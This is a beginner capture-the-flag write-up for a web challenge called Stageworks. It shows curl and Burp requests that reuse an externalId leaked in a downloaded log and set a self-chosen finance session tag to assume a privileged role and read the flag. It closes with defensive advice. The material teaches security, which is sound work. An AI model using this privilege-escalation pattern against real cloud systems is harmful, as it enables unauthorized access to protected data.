# Stageworks — Beginner Writeup (Broken Access Control / Cloud-Style AssumeRole)

> **Note on scope:** This writeup covers **one** challenge — **Stageworks** — using only
> **curl**, **unzip/cat**, and optionally **Burp Suite**. No Python, no scripting. Everything
> below is the real challenge, the real requests, and the real flag.

---

## 1. Challenge Overview

**Stageworks** is a **web** challenge from the **Safaricom CTF (safctf)**. The service mimics
a cloud-style identity system: you start as a lowly "visitor," and there is an API to **assume
a role** and then **read a protected object**. The **goal** is to escalate from visitor to a
privileged role and read the object that holds the flag.

- Category: **Web — Broken Access Control (cloud "AssumeRole" style)**
- Difficulty: **Medium–Hard (350 points)**
- Service: `http://54.72.82.22:8400` (event-local; may be offline after the CTF)
- Flag: `safctf{b9d2678027feea5870c41931b663fd6d}`

We do not spoil the method here — that begins in Section 3.

---

## 2. What You Need Before Starting

A beginner should budget **30 to 50 minutes**.

**Tools:**

- **curl** — send web requests from the terminal:
  ```
  sudo apt install curl
  ```
- **unzip** — open the downloadable archive:
  ```
  sudo apt install unzip
  ```
- **cat / a text editor** — already on Kali, for reading small JSON and log files.
- **(Optional) Burp Suite** — a proxy to catch and re-send requests by hand:
  ```
  sudo apt install burpsuite
  ```
  We show the **curl** way first (simplest) and the **Burp Repeater** way as an alternative.

**Accounts / VPN:** none. The API is plain HTTP with no login.

---

## 3. Reconnaissance

The rule for web CTFs: **read everything the app tells you about itself first.**

**Step 1 — Open the site and read the "Desk services" note.** Visit
`http://54.72.82.22:8400`. The page documents three API endpoints and links to a download.

```
GET  /api/identity                              -> who am I right now
POST /api/assume   (role, external_id, tags)    -> become a different role
GET  /api/object   (uses header X-Session)      -> read a protected object
```

[SCREENSHOT: the Stageworks homepage showing the three documented endpoints and the rehearsal.zip link]

**Step 2 — Ask the API who we are.**

What/why: establish our starting identity.

```
curl -s http://54.72.82.22:8400/api/identity
```

Output:

```json
{"account":"stageworks","role":"visitor","session":"guest"}
```

We are a **visitor** with a **guest** session — the lowest level. To read anything protected
we'll need to *assume* a better role.

**Step 3 — Download and open the provided archive.** Downloads often leak config.

```
curl -s -o rehearsal.zip http://54.72.82.22:8400/downloads/rehearsal.zip
unzip rehearsal.zip
```

Output:

```
Archive:  rehearsal.zip
  inflating: policy.json
  inflating: deployment.log
```

**Step 4 — Read the policy file.**

```
cat policy.json
```

Output (formatted for readability):

```json
{
  "trust":  { "role": "lighting", "externalId": "integration-value" },
  "object": { "condition": { "sessionTag/department": "finance" } },
  "tagSession": true
}
```

In plain English this says:

- To assume the **`lighting`** role you must present the right **`externalId`** (a shared
  secret). Here it literally reads `"integration-value"` — that looks like a **placeholder**,
  not a real secret.
- To read the protected **object**, your session must carry a **tag** `department=finance`.
- `tagSession: true` means the server lets you attach tags when you assume the role.

**Step 5 — Read the deployment log.** The policy's `externalId` looked fake, so check the log.

```
cat deployment.log
```

Output:

```
Lighting integration: externalId=d4a868d5e1dbf4bf89c6c520
```

There it is — the **real** externalId. The policy file was a stale/sanitized copy; the log
leaked the value the live service actually checks.

[SCREENSHOT: terminal showing policy.json with the placeholder externalId next to deployment.log with the real externalId]

---

## 4. Identifying the Vulnerability

This is **Broken Access Control**, modeled on a real cloud pattern: **AssumeRole with an
ExternalId**, plus **session tags**. Two things make it exploitable: a **leaked secret** and
the fact that *we*, the caller, get to choose our own session tags.

**Define the terms (first time):**

- **AssumeRole** = a feature where one identity temporarily "becomes" another role to gain
  that role's permissions. (In real clouds like AWS, this is the `sts:AssumeRole` action.)
- **ExternalId** = a shared secret you must present when assuming a role, meant to stop the
  **confused-deputy problem** — where a trusted middle-man is tricked into using its powers
  on an attacker's behalf. The ExternalId is the "password" that proves the request is
  legitimate.
- **Session tags** = little key/value labels attached to your temporary session (e.g.
  `department=finance`). Resources can require a specific tag before granting access.

**Root cause.** Two mistakes stacked together:

1. **A secret was leaked.** The real `externalId` was written into `deployment.log` and shipped
   in a public download. A secret in a log file is a secret no more.
2. **The caller controls their own tags.** The object only asks for a session tagged
   `department=finance`, and the service lets us set that tag ourselves when we assume the
   role. There is no check that we *actually* belong to finance.

**Analogy.** Think of a **valet key plus a guest wristband**. The ExternalId is the valet key
that unlocks the "lighting" car — it was supposed to be secret, but someone taped it to the
dashboard (the log). The `department=finance` tag is a wristband that the bouncer checks at
the vault door — but the venue hands you a blank wristband and lets you write "finance" on it
yourself. With the key *and* a self-written wristband, you drive straight to the vault.

**What tipped us off:**

- `/api/identity` showed we were a weak **visitor** — escalation was clearly the point.
- `policy.json` named a role (`lighting`) and an `externalId` that was obviously a placeholder.
- `deployment.log` leaked the matching real `externalId`.
- The object's only requirement was a **tag we are allowed to set ourselves**.

---

## 5. Exploitation Step by Step

Two requests total: **assume the role** (get a session), then **read the object** (get the flag).

**Step 1 — Prove the normal path is blocked (baseline).**

What/why: confirm a plain visitor can't read the object, so we know the escalation is what matters.

```
curl -s http://54.72.82.22:8400/api/object -H "X-Session: guest"
```

Expected output (a refusal of some kind):

```json
{"message":"The request could not be completed.","ok":false}
```

**Step 2 — Assume the `lighting` role with the real secret AND the finance tag.**

What/why: this is the whole exploit. We present the leaked `external_id` to pass the trust
check, and we attach `tags.department=finance` so the resulting session satisfies the object's
condition.

```
curl -s -X POST http://54.72.82.22:8400/api/assume \
  -H "Content-Type: application/json" \
  -d '{"role":"lighting","external_id":"d4a868d5e1dbf4bf89c6c520","tags":{"department":"finance"}}'
```

Expected output (a session token — yours will differ):

```json
{"token":"ccf250243e2ecca26b6cc90396be559b5161"}
```

What to look for: a **`token`** field. That string is our temporary privileged session. If you
instead get `"ok":false`, re-check two things — the `external_id` must be the one from
**deployment.log** (not the placeholder from policy.json), and the tag must be exactly
`department=finance`. **Both** are required; drop either and it fails.

[SCREENSHOT: curl POST to /api/assume returning a token]

**Step 3 — Use the token to read the protected object.**

What/why: the object endpoint reads your session from the **`X-Session`** header; paste the
token from Step 2 there.

```
curl -s http://54.72.82.22:8400/api/object -H "X-Session: ccf250243e2ecca26b6cc90396be559b5161"
```

Expected output:

```json
{"message":"safctf{b9d2678027feea5870c41931b663fd6d}","ok":true}
```

`"ok":true` plus a `safctf{...}` string means we're in.

[SCREENSHOT: curl GET to /api/object with the X-Session header returning the flag]

### Burp Suite alternative (same two steps, by hand)

1. In **Proxy**, turn **Intercept on**, submit any request from the site so you catch one.
2. Right-click the request → **Send to Repeater**.
3. In **Repeater**, change the method/path to `POST /api/assume`, set header
   `Content-Type: application/json`, and set the body to
   `{"role":"lighting","external_id":"d4a868d5e1dbf4bf89c6c520","tags":{"department":"finance"}}`.
   Click **Send**. Copy the `token` from the response.
4. Open a second **Repeater** tab: `GET /api/object` with a header
   `X-Session: <paste the token>`. Click **Send**. The flag appears in the response.

[SCREENSHOT: Burp Repeater showing the /api/assume response token and the /api/object response flag side by side]

---

## 6. Capturing the Flag

The flag arrived in the **JSON response** of the final request, in the `message` field:

```
GET /api/object   with header   X-Session: <token from /api/assume>
```

Response:

```json
{"message":"safctf{b9d2678027feea5870c41931b663fd6d}","ok":true}
```

**Flag:** `safctf{b9d2678027feea5870c41931b663fd6d}`

Copy it exactly, braces included, and submit it on the CTF scoreboard.

---

## 7. Why This Works (Beginner Explanation)

Modern systems don't give every program full power. Instead, a weak identity **temporarily
assumes** a stronger role only when it proves it's allowed. The proof here is the
**ExternalId** — a shared secret. The entire security of "assume role" rests on that secret
staying secret. The moment it landed in a downloadable **log file**, the lock still existed
but the key was taped next to it.

The second half is **session tags**. The vault door asked for one thing: a session labeled
`department=finance`. In a safe design, that tag would be set by the *server* based on who you
really are. Here the server trusted the **caller** to label themselves — so we simply labeled
ourselves "finance." Trusting attacker-supplied attributes for access decisions is a classic
mistake.

In the real world this is exactly how cloud breaches happen: a secret leaks into a Git repo,
a log, or a public bucket, and an attacker uses it to assume a powerful role and reach data
they should never see. The ExternalId mechanism exists specifically to prevent the
**confused-deputy** problem — but a leaked ExternalId defeats it entirely.

---

## 8. Common Mistakes and Dead Ends

1. **Using the placeholder externalId.** `policy.json` says `"externalId":"integration-value"`.
   That is a stale sample value and will be rejected. The **real** value is only in
   `deployment.log`. If `/api/assume` returns `"ok":false`, this is the usual reason.
2. **Forgetting the tag.** Assuming the role with the right secret but **no** `department=finance`
   tag gets you a token that still can't read the object. You need the secret **and** the tag.
3. **Putting the token in the wrong place.** `/api/object` reads the session from the
   **`X-Session` header**, not from a URL parameter or a cookie. Beginners often paste it as
   `?session=...` and get nothing.
4. **Trying to brute-force or guess the externalId.** It's a 24-character hex string — not
   guessable. The intended path is to **find the leak**, not crack it. If you catch yourself
   writing a brute-forcer, stop and re-read the files you were given.

---

## 9. How to Defend Against This

- **Never log secrets.** Treat ExternalIds, tokens, and keys as values that must never be
  written to logs, build output, or anything shippable. Scan logs/repos for secrets in CI.
- **Rotate any secret that was ever exposed.** Once an ExternalId appears in a file like this,
  it must be considered burned and replaced immediately.
- **Set session tags server-side from a trusted source** (the real user record / directory),
  never from caller-supplied input. Do not let a caller label themselves into access.
- **Enforce least privilege on the role itself.** Even if someone assumes `lighting`, the role
  should only reach what it genuinely needs — so a stolen session has limited blast radius.
- **Ship sanitized artifacts only.** Downloads, exports, and "rehearsal" bundles should be
  reviewed so a placeholder in one file isn't quietly contradicted by a real secret in another.

---

## 10. Key Takeaways

- **Read the free files first.** Downloads (`rehearsal.zip`) and logs leaked everything we
  needed — the secret and the exact tag condition.
- **A placeholder in one file + a real value in another = a leak.** Always cross-check config
  against logs.
- **Access decisions must not trust attacker-controlled attributes** (self-chosen session tags).
- **Cheatsheet moves worth saving:**
  ```
  curl -s URL/api/identity
  curl -s -o a.zip URL/downloads/<file>.zip && unzip a.zip && cat *.json *.log
  curl -s -X POST URL/api/assume -H 'Content-Type: application/json' -d '{"...":"..."}'
  curl -s URL/api/object -H "X-Session: <token>"
  ```
- **Two-request escalations are everywhere:** request #1 gets a credential, request #2 spends
  it. Learn to spot that shape.

You just performed a real cloud-style privilege escalation with nothing but curl and your
eyes — that's exactly how professional testers find these bugs. Keep going; you're closer to
"real pentester" than you think.



